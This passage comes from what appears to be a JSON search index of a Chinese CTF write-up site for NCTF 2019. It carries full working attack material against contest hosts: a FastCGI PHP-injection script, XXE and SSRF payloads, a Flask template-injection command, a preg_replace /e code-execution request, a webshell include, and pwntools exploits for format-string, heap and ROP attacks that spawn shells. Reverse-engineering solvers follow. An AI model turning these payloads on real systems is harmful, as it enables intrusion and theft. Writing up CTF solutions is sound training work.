?>') parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = \"/\" uri = args.file content = args.code params = { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'POST', 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'), 'SCRIPT_NAME': uri, 'QUERY_STRING': '', 'REQUEST_URI': uri, 'DOCUMENT_ROOT': documentRoot, 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '9985', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1', 'CONTENT_TYPE': 'application/text', 'CONTENT_LENGTH': \"%d\" % len(content), 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'safe_mode=Off\\nopen_basedir=Off\\ndisable_functions=Off\\nallow_url_include = On' } response = client.request(params, content) print(force_text(response))","title":"phar matches everything(\u63a8\u8350\u597d\u597d\u7814\u7a76\u4e00\u4e0b)"},{"location":"writeup/NJUPT-2019/#fake-xml-cookbook","text":"F12\u770b\u4e86\u4e00\u773c\u53d1\u73b0 function doLogin(){ var username = $(\"#username\").val(); var password = $(\"#password\").val(); if(username == \"\" || password == \"\"){ alert(\"Please enter the username and password!\"); return; } var data = \"<user><username>\" + username + \"</username><password>\" + password + \"</password></user>\"; $.ajax({ type: \"POST\", url: \"doLogin.php\", contentType: \"application/xml;charset=utf-8\", data: data, dataType: \"xml\", anysc: false, success: function (result) { var code = result.getElementsByTagName(\"code\")[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(\"msg\")[0].childNodes[0].nodeValue; if(code == \"0\"){ $(\".msg\").text(msg + \" login fail!\"); }else if(code == \"1\"){ $(\".msg\").text(msg + \" login success!\"); }else{ $(\".msg\").text(\"error:\" + msg); } }, error: function (XMLHttpRequest,textStatus,errorThrown) { $(\".msg\").text(errorThrown + ':' + textStatus); } }); } \u7528XML\u548c\u670d\u52a1\u5668\u901a\u8baf\uff0c\u8054\u60f3\u5230XXE\u653b\u51fb burp\u6293post\u5305\u5f97\u5230 POST /doLogin.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40002 Content-Length: 207 Accept: application/xml, text/xml, */*; q=0.01 Origin: http://nctf2019.x1ct34m.com:40002 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 DNT: 1 Content-Type: application/xml;charset=UTF-8 Referer: http://nctf2019.x1ct34m.com:40003/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close <user><username>admin</username><password>123</password></user> \u6839\u636ejs\u811a\u672c\u53ef\u4ee5\u53d1\u73b0username\u662f\u53ef\u4ee5\u56de\u663e\u7684 \u7136\u540e\u6784\u9020\u4e00\u4e0bexp POST /doLogin.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40002 Content-Length: 207 Accept: application/xml, text/xml, */*; q=0.01 Origin: http://nctf2019.x1ct34m.com:40002 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 DNT: 1 Content-Type: application/xml;charset=UTF-8 Referer: http://nctf2019.x1ct34m.com:40003/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\"> ]> <user><username>&xxe;</username><password>123</password></user>","title":"Fake XML cookbook"},{"location":"writeup/NJUPT-2019/#true-xml-cookbook","text":"XML+SSRF\u6253\u5185\u7f51 POST /doLogin.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40003 Content-Length: 220 Accept: application/xml, text/xml, */*; q=0.01 Origin: http://nctf2019.x1ct34m.com:40003 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 DNT: 1 Content-Type: application/xml;charset=UTF-8 Referer: http://nctf2019.x1ct34m.com:40003/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=http://192.168.1.8\"> ]> <user><username>&xxe;</username><password>123</password></user> NCTF{XXE-labs_is_g00d}","title":"True XML cookbook"},{"location":"writeup/NJUPT-2019/#flask","text":"\u6a21\u677f\u6ce8\u5165,\u7528\u901a\u914d\u7b26\u8bfbflag http://nctf2019.x1ct34m.com:40007/%7B%7B''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('cat%20/fla?%27).read()%7D%7D","title":"flask"},{"location":"writeup/NJUPT-2019/#upload-your-shell","text":"\u4f20\u4e00\u4e2a\u56fe\u7247\u9a6c,\u4f1a\u8fd4\u56de\u4e00\u4e2a\u9898\u76ee\u672c\u8eab\u5c31\u51c6\u5907\u597d\u7684\u56fe\u7247\u9a6c\u7684\u6240\u5728\u76ee\u5f55 \u627e\u4e2a\u5730\u65b9\u5305\u542b\u4e00\u4e0b\u5c31\u597d\u4e86 http://nctf2019.x1ct34m.com:60002/index.php?action=/upload-imgs/9ae46c526dfb6d96e95ad35bfbb2b6c4/Th1s_is_a_fl4g.jpg","title":"Upload your Shell"},{"location":"writeup/NJUPT-2019/#replace","text":"\u586b\u4e09\u4e2a\"#\"\u62a5\u9519 Parse error: syntax error, unexpected end of file in /var/www/html/index.php(70) : regexp code on line 1 Fatal error: preg_replace(): Failed evaluating code: # in /var/www/html/index.php on line 70 \u5b9e\u73b0\u529f\u80fd\u4f7f\u7528\u7684\u662fpreg_replace() \u9898\u76ee\u63d0\u793a\u7528\u4e86php5.6 \u60f3\u5230preg_replace() /e\u53c2\u6570 \u8bd5\u4e00\u4e0b\u53ef\u4ee5\u6267\u884cphpinfo() POST /index.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40006 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 72 Origin: http://nctf2019.x1ct34m.com:40006 Connection: close Referer: http://nctf2019.x1ct34m.com:40006/index.php Cookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g Upgrade-Insecure-Requests: 1 sub=text&pat=e&rep=phpinfo(); \u4f46\u662f\u76f4\u63a5\u7528readfile('/flag')\u8bfb\u6587\u4ef6\uff0c\u53d1\u73b0\u5355\u5f15\u53f7\u88ab\u62e6\u622a \u4e8e\u662f\u7528chr()\u62fc\u63a5\u8868\u793a\u5b57\u7b26\u4e32\u3002\u3002\u3002\u3002\u3002 POST /index.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40006 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 72 Origin: http://nctf2019.x1ct34m.com:40006 Connection: close Referer: http://nctf2019.x1ct34m.com:40006/index.php Cookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g Upgrade-Insecure-Requests: 1 sub=text&pat=e&rep=readfile(chr(47).chr(102).chr(108).chr(97).chr(103));","title":"replace"},{"location":"writeup/NJUPT-2019/#pwn","text":"","title":"Pwn"},{"location":"writeup/NJUPT-2019/#hello_pwn","text":"\u8fde\u63a5nc\u540e\u53d1\u73b0\u8ba9\u6211\u7528pwntools \u6784\u9020exp \u83b7\u5f97flag","title":"hello_pwn"},{"location":"writeup/NJUPT-2019/#pwn_me_1","text":"\u57fa\u7840\u6808\u6ea2\u51fa from pwn import * a=remote(\"139.129.76.65\",\"50004\") ad=0x400861 payload='yes\\0'+'a'*12+p64(0x66666666) a.sendline(payload) a.interactive()","title":"pwn_me_1"},{"location":"writeup/NJUPT-2019/#pwn_me_2","text":"\u57fa\u7840\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 #coding:utf-8 from pwn import * path = './pwn_me_2' local = 0 attach = 0 #P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50005) p.recvuntil('but your name:\\n') p.send('%p'*15) p.recvuntil('preparing......\\n') base = int(p.recv(14),16) - (0x55f5229a5080-0x000055f5227a3000) log.success('base = '+hex(base)) target = base+0x2020e0 p.recvuntil('what do you want?\\n') payload = '%'+str(0x66)+'c%10$hhn'+'%'+str(0x666666-0x66)+'c%11$lln....'+p64(target)+p64(target+1) p.send(payload) #NCTF{rrr_loves_pwn_and_100years} if attach == 1: gdb.attach(p) p.interactive()","title":"pwn_me_2"},{"location":"writeup/NJUPT-2019/#pwn_me_3","text":"\u57fa\u7840unlink #coding:utf-8 from pwn import * path = './pwn_me_3' local = 1 attach = 0 #P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50006) def add(size,content): p.recvuntil('5,exit\\n') p.sendline('1') p.recvuntil('size:\\n') p.sendline(str(size)) p.recvuntil('content:\\n') p.send(content) def delete(index): p.recvuntil('5,exit\\n') p.sendline('2') p.recvuntil('idx:\\n') p.sendline(str(index)) def show(index): p.recvuntil('5,exit\\n') p.sendline('3') p.recvuntil('idx\\n') p.sendline(str(index)) def edit(index,content): p.recvuntil('5,exit\\n') p.sendline('4') p.recvuntil('idx:\\n') p.sendline(str(index)) p.recvuntil('content:\\n') p.send(content) add(0x10,'\\x00'*0x10) #0 add(0x10,'\\x11'*0x10) #1 delete(0) delete(1) p.recvuntil('5,exit\\n') p.sendline('1') p.recvuntil('size:\\n') p.sendline('0') p.recvuntil('content:\\n') edit(0,'\\x50') show(0) heap_addr = u64(p.recvuntil('\\n',drop=True).ljust(8,'\\x00')) - 0x50 log.success('heap_addr = '+hex(heap_addr)) add(0x38,'\\x11'*0x30) #1 add(0xf0,'\\x22'*0xf0) #2 add(0x20,'\\x33'*0x20) #3 delete(1) payload = p64(0) + p64(0x31) + p64(0x6020e8-0x18) + p64(0x6020e8-0x10) + p64(0)*2 + p64(0x30) add(0x38,payload) delete(2) payload = p64(0)*2 + p64(heap_addr+0x10) edit(1,payload) edit(0,p64(0x66666666)) p.recvuntil('5,exit\\n') p.sendline('5') #NCTF{Ohh!h0pe_y0u_c4n_pwn_100years_too} if attach == 1: gdb.attach(p) p.interactive()","title":"pwn_me_3"},{"location":"writeup/NJUPT-2019/#warmup","text":"\u57fa\u7840rop #coding:utf-8 from pwn import * path = './warm_up' local = 1 attach = 0 P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50007) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p.recvuntil('p!!!\\n') p.send('\\x11'*0x18+'\\x12') p.recvuntil('\\x12') canary = u64(p.recv(7)+'\\x00') log.success('canary = '+hex(canary)) p.recvuntil('?') payload = p64(0)*3 + '\\x00' + p64(canary)[:7] payload+= p64(0) payload+= p64(0x400ab6) p.send(payload) p.recvuntil('warm up!!!') p.send('\\x11'*0x2f+'\\x12') p.recvuntil('\\x12') libcbase = u64(p.recv(6).ljust(8,'\\x00')) - libc.sym['__libc_start_main'] - 240 log.success('libcbase = '+hex(libcbase)) p_rdx_rsi = 0x00000000001150c9 + libcbase p_rdi = 0x400bc3 p_rbp = 0x400970 leave = 0x400a49 flag_addr = 0x601a00 + 0x98 p.recvuntil('?') payload = p64(0)*3 + '\\x00' + p64(canary)[:7] payload+= p64(0) payload+= p64(p_rdi) + p64(0) payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601a00) payload+= p64(libcbase+libc.sym['read']) payload+= p64(p_rbp) + p64(0x601a00) payload+= p64(leave) p.send(payload) raw_input() payload = p64(0x601a00) payload+= p64(p_rdi) + p64(flag_addr) payload+= p64(p_rdx_rsi) + p64(0) + p64(0) payload+= p64(libcbase+libc.sym['open']) payload+= p64(p_rdi) + p64(3) payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601b00) payload+= p64(libcbase+libc.sym['read']) payload+= p64(p_rdi) + p64(1) payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601b00) payload+= p64(libcbase+libc.sym['write']) payload+= './flag' p.send(payload) if attach == 1: gdb.attach(p) p.interactive()","title":"warmup"},{"location":"writeup/NJUPT-2019/#easy_rop","text":"\u57fa\u7840rop #coding:utf-8 from pwn import * path = './easy_rop' local = 1 attach = 0 P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50002) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') for i in range(26): p.recvuntil(': ') p.sendline(str(0)) p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') p.recvuntil('28 = ') base1 = int(p.recvuntil('\\n',drop=True),10) log.success('base1 = '+hex(base1)) p.recvuntil(': ') p.sendline('+') p.recvuntil('29 = ') base2 = int(p.recvuntil('\\n',drop=True),10) log.success('base2 = '+hex(base2)) base = str(hex(base2))+str(hex(base1))[2:] base = int(base,16) - (0x55e9d0e36b40-0x000055e9d0e36000) log.success('base = '+hex(base)) start = base + 0x8a0 start1 = str(hex(start))[2:6] start2 = str(hex(start))[6:] start1 = int(start1,16) start2 = int(start2,16) p.recvuntil(': ') p.sendline(str(start2)) p.recvuntil(': ') p.sendline(str(start1)) p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') p.recvuntil('your name?\\n') p.send('\\x00') #====================================== for i in range(26): p.recvuntil(': ') p.sendline(str(0)) p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') target = base + 0x201420 target1 = str(hex(target))[2:6] target2 = str(hex(target))[6:] target1 = int(target1,16) target2 = int(target2,16) p.recvuntil(': ') p.sendline(str(target2)) p.recvuntil(': ') p.sendline(str(target1)) leave = base + 0xb31 leave1 = str(hex(leave))[2:6] leave2 = str(hex(leave))[6:] leave1 = int(leave1,16) leave2 = int(leave2,16) p.recvuntil(': ') p.sendline(str(leave2)) p.recvuntil(': ') p.sendline(str(leave1)) p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') part1 = base + 0xb96 part2 = base + 0xb80 def call_fun(fun_addr,arg1,arg2,arg3): payload = p64(part1) payload+= p64(0) payload+= p64(0) payload+= p64(1) payload+= p64(fun_addr) payload+= p64(arg1) payload+= p64(arg2) payload+= p64(arg3) payload+= p64(part2) payload+= 'a'*0x38 return payload p_rdi = base + 0xba3 p_rbp = base + 0x900 p.recvuntil('your name?\\n') payload = p64(target) payload+= p64(p_rdi) payload+= p64(P.got['puts']+base) payload+= p64(P.plt['puts']+base) payload+= call_fun(P.got['read']+base,0x100,base+0x201500,0) payload+= p64(p_rbp) payload+= p64(base+0x201500) payload+= p64(leave) p.send(payload) libcbase = u64(p.recv(6).ljust(8,'\\x00')) - libc.sym['puts'] log.success('libcbase = '+hex(libcbase)) payload = p64(base+0x201500) payload+= p64(p_rdi) payload+= p64(libcbase+libc.search('/bin/sh\\x00').next()) payload+= p64(libcbase+libc.sym['system']) p.send(payload) #NCTF{rop_1s_b4st!!!!} if attach == 1: gdb.attach(p) p.interactive()","title":"easy_rop"},{"location":"writeup/NJUPT-2019/#easy_heap","text":"\u4e24\u6b21fb_atk #coding:utf-8 from pwn import * path = './easy_heap' local = 1 attach = 0 #P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50001) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def new(size,content): p.recvuntil('4. exit\\n') p.sendline('1') p.recvuntil('size?\\n') p.sendline(str(size)) p.recvuntil('ontent?\\n') p.send(content) def delete(index): p.recvuntil('4. exit\\n') p.sendline('2') p.recvuntil('index?\\n') p.sendline(str(index)) def show(index): p.recvuntil('4. exit\\n') p.sendline('3') p.recvuntil('index?\\n') p.sendline(str(index)) p.recvuntil('your name?\\n') p.send(p64(0)+p64(0x60)) new(0x50,'\\x00'*0x50) #0 new(0x50,'\\x11'*0x50) #1 delete(0) delete(1) delete(0) new(0x50,p64(0x602060)) new(0x50,'\\x33'*0x50) new(0x50,'\\x44'*0x50) payload = p64(0) + p64(0x1000) + p64(0)*8 new(0x50,payload) new(0x80,'\\x00') #0 new(0x60,'\\x11'*0x60) #1 delete(0) show(0) p.recvuntil('0: ') libcbase = u64(p.recv(6).ljust(8,'\\x00')) - (0x7f54cfedab78-0x00007f54cfb16000) log.success('libcbase = '+hex(libcbase)) new(0x60,'\\x22'*0x60) delete(1) delete(2) delete(1) new(0x60,p64(libcbase+libc.sym['__malloc_hook']-0x23)) new(0x60,'\\x00') new(0x60,'\\x00') one_gadget = [0x4526a,0x45216,0xf02a4,0xf1147] payload = '\\x00'*0x13 + p64(libcbase+one_gadget[2]) new(0x60,payload) delete(6) if attach == 1: gdb.attach(p) p.interactive()","title":"easy_heap"},{"location":"writeup/NJUPT-2019/#re","text":"","title":"Re"},{"location":"writeup/NJUPT-2019/#_1","text":"IDA\u6253\u5f00 \u8fdb\u5230 sub_401340 \u4e2d \u5c31\u662f\u6709\u4e00\u4e2a7*7\u7684\u77e9\u9635\u548c\u6211\u4eec\u8f93\u5165\u768449\u4f4d\u5b57\u7b26\u7684ASCII\u7801\u6309\u5217\u6392\u5e03\u6784\u6210\u7684\u77e9\u9635(\u7b2c\u4e00\u5217\u662fa[0]~a[6])\u76f8\u4e58\u4f1a\u5f97\u5230dword_404000 \u9664\u4e86 dword_404000[0]=4884h \u5916\u90fd\u662f4\u884c\u4ee3\u8868\u4e00\u4e2a\u5143\u7d20,\u5373 dword_404000[1]=91C4h dword_404000[2]=7D35h dword_404000[3]=81FEh ... \u7136\u540e\u5c31\u662f\u6c42\u89e3\u975e\u9f50\u6b21\u7ebf\u6027\u65b9\u7a0b\u7ec4\u4e86 $$ \\left{ \\begin{matrix} 12 & 53 & 6 & 34 & 58 & 36 & 1 \\ 83 & 85 & 12 & 73 & 27 & 96 & 52 \\ 78 & 53 & 24 & 36 & 86 & 25 & 46 \\ 39 & 78 & 52 & 9 & 62 & 37 & 84 \\ 23 & 6 & 14 & 74 & 48 & 12 & 83 \\ 27 & 85 & 92 & 42 & 48 & 15 & 72 \\ 4 & 6 & 3 & 67 & 0 & 26 & 68 \\end{matrix} \\right} \\tag{1} $$ $$ \\left{ \\begin{matrix} a1[0] & a1[7] & a1[14] & a1[21] & a1[28] & a1[35] & a1[42] \\ a1[1] & a1[8] & a1[15] & a1[22] & a1[29] & a1[36] & a1[43] \\ a1[2] & a1[9] & a1[16] & a1[23] & a1[30] & a1[37] & a1[44] \\ a1[3] & a1[10] & a1[17] & a1[24] & a1[31] & a1[38] & a1[45] \\ a1[4] & a1[11] & a1[18] & a1[25] & a1[32] & a1[39] & a1[46] \\ a1[5] & a1[12] & a1[19] & a1[26] & a1[33] & a1[40] & a1[47] \\ a1[6] & a1[13] & a1[20] & a1[27] & a1[34] & a1[41] & a1[48] \\end{matrix} \\right} \\tag{2} $$ $$ \\left{ \\begin{matrix} d[0] & d[7] & d[14] & d[21] & d[28] & d[35] & d[42] \\ d[1] & d[8] & d[15] & d[22] & d[29] & d[36] & d[43] \\ d[2] & d[9] & d[16] & d[23] & d[30] & d[37] & d[44] \\ d[3] & d[10] & d[17] & d[24] & d[31] & d[38] & d[45] \\ d[4] & d[11] & d[18] & d[25] & d[32] & d[39] & d[46] \\ d[5] & d[12] & d[19] & d[26] & d[33] & d[40] & d[47] \\ d[6] & d[13] & d[20] & d[27] & d[34] & d[41] & d[48] \\end{matrix} \\right} \\tag{3} $$ (1) * (2) = (3) NCTF{nctf2019_linear_algebra_is_very_interesting}","title":"\u7b7e\u5230\u9898"},{"location":"writeup/NJUPT-2019/#debug","text":"IDA\u6253\u5f00 \u6211\u6ca1\u622a\u56fe2333\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u901a\u8fc7\u52a8\u8c03\u6765\u5f97\u5230\u7b54\u6848\uff0c\u597d\u50cf\u662f\u4e2d\u9014\u751f\u6210flag\u6765\u548c\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u6bd4\u8f83 \u53ea\u9700\u8981\u518d\u6bd4\u8f83\u7684\u5730\u65b9\u4e0b\u65ad\u70b9\uff0c\u67e5\u770b\u6808\u5373\u53ef\u5f97\u5230\u7b54\u6848\u3002","title":"debug"},{"location":"writeup/NJUPT-2019/#easy-ternary","text":"AHK\u811a\u672c\u8bed\u8a00\u5f88\u660e\u767d\u4e86\uff0c\u76f4\u63a5\u5230exe\u91cc\u628a\u811a\u672c\u63d0\u51fa\u6765 XOR(a, b) { tempA := a tempB := b ret := 0 Loop, 8 { ret += Mod((((tempA >> ((A_Index - 1)*4)) & 15) + ((tempB >> ((A_Index - 1)*4)) & 15)),3) * (16**(A_Index-1)) } return ret } InputBox, userInput, TTTTCL, Input your flag: if(ErrorLevel) Exit if(!StrLen(userInput)) #\u6ca1\u6709\u8bfb\u5165 { MsgBox, GG Exit } inputArr := [] #\u4fdd\u5b58\u8f93\u5165\u7684\u6570\u636e Loop, parse, userInput { temp:=A_Index inputArr.Push(Ord(A_LoopField)) #\u8bfb\u5165\u8bfb\u5165\u6846 } inputNum := [] #\u64cd\u4f5c\u540e\u4fdd\u5b58\u7684\u6570\u7ec4 Loop % inputArr.Length() { temp := inputArr[A_Index] temp := DllCall(\"aiQG.dll\\?ToTrit@@YAII@Z\", \"UInt\", temp) inputNum.push(temp) } key1 := XOR(inputNum[5], inputNum[inputNum.Length()]) #key\u5c31\u662f{}\u7684XOR inputFlag := [] Loop % inputArr.Length() { temp := XOR(inputNum[A_Index], key1) if(Mod(A_Index,2)) { temp := XOR(key1,temp) } inputFlag.push(temp) } temp1 := 1 #\u662f\u5426\u6210\u529f Loop % inputFlag.Length() #\u68c0\u9a8c { temp := inputFlag[A_Index] temp := DllCall(\"aiQG.dll\\?Check@@YAIII@Z\", \"UInt\", temp, \"UInt\", A_Index) if(!temp) { temp1 := 0 } } if(temp1) { MsgBox, Ok } if(!temp1) { MsgBox, GG } \u8c03\u7528\u4e86dll,\u9006\u5411dll\uff0c\u53d1\u73b0\u5c31\u4e00\u4e2a\u5bf9\u6bd4\u6570\u5b57\u548c\u8f6c\u4e09\u8fdb\u5236 exp\uff1a #include<cstdio> #include<cmath> #include<windows.h> using namespace std; int xors(int a,int b) { int ret=0; for(int i=1;i<=8;i++) ret=ret+(((a>>(((i-1)*4))&15)+((b>>((i-1)*4))&15))%3)*(pow(16,(i-1))); return ret; } int change(int x) { int t,ans=0,k=0; while(x) { t=x%10; ans=ans+pow(3,k++)*t; x/=10; } return ans; } void genS() { int data[100]={0x00,0x10011,0x21020,0x21101,0x21000,0x22211,0x2220,0x21200,0x2101,0x22120,0x20122,0x22220,0x2021,0x10122,0x20102,0x22111,0x211,0x12012,0x2210,0x22202,0x2021,0x21101,0x2222,0x21101,0x2222,0x21121,0x21120,0x22210}; for(int c=1;c<=27;c++) { for(int i=0;i<=0x22222222;i++) { int t=xors(i,0x22212); if(c%2) t=xors(0x22212,t); if(t==data[c]) { printf(\"%X,\",i); break; } } } } int main() { int s[1000]={2220,2111,10010,2121,11120,10011,10112,10222,11002,1210,11102,10112,2001,1220,11020,11002,1221,10001,11111,10112,10010,10010,10010,10010,10000,2211,11122,0}; for(int i=0;s[i]!=0;i++) printf(\"%c\",change(s[i])); return 0; }","title":"Easy Ternary"},{"location":"writeup/NJUPT-2019/#_2","text":"\u786e\u5b9e\u591f\u4e11\u964b\u7684\uff0c\u5230\u5904\u8df3\u8f6c IDA\u6253\u5f00\u540e\u53d1\u73b0\u6709\u53cd\u8c03\u8bd5\uff0cnop\u6389\uff0c\u53d1\u73b0\u539f\u6765\u65e0\u6cd5\u8fd0\u884c\u7684\u51fd\u6570\u53ef\u4ee5\u8fd0\u884c\u4e86(\u4e4b\u524d\u5f02\u6216\u4e86) \u9274\u4e8e\u65e0\u6cd5F5\uff0c\u5f00\u59cb\u5934\u94c1\u65f6\u95f4\uff0c\u53d1\u73b0\u6700\u540e\u5c31\u662f\u4e2aTEA #include<cstdio> #define _DWORD int using namespace std; unsigned char code[]={0x88,0x71,0x3E,0xFE,0x66,0xF6,0x77,0xD7,0xA0,0x51,0x29,0xF9,0x11,0x79,0x71,0x49,0xF1,0x61,0xA0,0x9,0xF1,0x29,0x1,0xB1}; /* tea_decrypt(0x61869F5E,0x0A9CF08D); tea_decrypt(0xAD74C0CA,0xA57F16B8); tea_decrypt(0xB559626D,0xD17B68E0);*/ int getlowbit(int x) { return x&0xFF; } void tea_decrypt(unsigned long v0,unsigned long v1) { unsigned long sum=0xC6EF3720,i; unsigned long delta=0x9e3779b9; unsigned long k0=0x12345678,k1=0xBADF00D,k2=0x05201314,k3=0x87654321; for(i=0;i<32;i++) { v1-=((v0<<4)+k2)^(v0+sum)^((v0>>5)+k3); v0-=((v1<<4)+k0)^(v1+sum)^((v1>>5)+k1); sum-=delta; } unsigned char* v=((unsigned char*)&v0); printf(\"0x%X 0x%X 0x%X 0x%X\\n\",getlowbit(*((char*)v)),getlowbit(*((char*)v+1)),getlowbit(*((char*)v+2)),getlowbit(*((char*)v+3))); v=((unsigned char*)&v1); printf(\"0x%X 0x%X 0x%X 0x%X\\n\",getlowbit(*((char*)v)),getlowbit(*((char*)v+1)),getlowbit(*((char*)v+2)),getlowbit(*((char*)v+3))); } unsigned char encode(unsigned char c) { int a=c>>5,b=c<<3; return ((a|b)^0x5A); } int main() { for(int i=0;i<24;i++) { int c=code[i]; for(int j=0;j<=0xFF;j++) if(c==encode(j)) { int t=j; if(i==0 || i==4) t-=0xC; if(i==1 || i==5) t-=0x22; if(i==2 || i==6) t-=0x38; if(i==3 || i==7) t-=0x4E; printf(\"%c\",t); } } return 0; }","title":"\u4e11\u964b\u7684\u4ee3\u7801"},{"location":"writeup/NJUPT-2019/#f-bird","text":"\u5f00\u5386\u53f2\u7684\u5012\u8f66\uff0c16\u4f4d\u90fd\u6765\u4e86 \u76f4\u63a5\u770b\u6c47\u7f16\uff0c\u6709\u4e00\u6bb5\u5f02\u6216\uff0c\u4e0d\u8fc7\u7528bx\u5bc4\u5b58\u5668\u9ad8\u4f4e\u4f4d\u4f9d\u6b21\u5f02\u6216 \u7b97\u51fa\u6765\u4e24\u4e2a\u5f02\u6216\u7684\u6570\u662f\u591a\u5c11 \u7136\u540e\u5f02\u6216\u5c31\u884c\u4e86 k=[0x8E,0x9D,0x94,0x98,0xBB,0x89,0xF3,0xEF,0x83,0xEE,0xAD,0x9B,0x9F,0x9A,0xF0,0xEB,0x9F,0x97,0xF6,0xBC,0xF1,0xE9,0x9F,0xE7,0xA1,0xB3,0xF3,0xA3] i=0 flag=\"\" for c in k: if(i&1): flag=flag+chr(c^0xde) else: flag=flag+chr(c^0xc0) i=i+1 print(flag)","title":"F-Bird"},{"location":"writeup/NJUPT-2019/#misc","text":"","title":"Misc"},{"location":"writeup/NJUPT-2019/#nctf2019","text":"\u586b\u8868\uff0c\u586b\u5b8c\u5c31\u51faflag","title":"NCTF2019\u95ee\u5377\u8c03\u67e5"},{"location":"writeup/NJUPT-2019/#pip2-install","text":"\u5148\u5229\u7528\u865a\u62df\u673a\u8fde\u63a5\u4e00\u4e0b\u3002[\u56fe\u7247] \u6211\u5df2\u7ecf\u4e0b\u8fc7\u4e86 \u4e0b\u8f7d\u7684\u8fc7\u7a0b\u4e2d\u6709\u4e00\u4e2a\u94fe\u63a5\u51fa\u6765\u4e86\u3002 win\u4e0b\u6253\u5f00\u5b83\uff01 \u5b58\u5728\u4e00\u4e2asetup.py 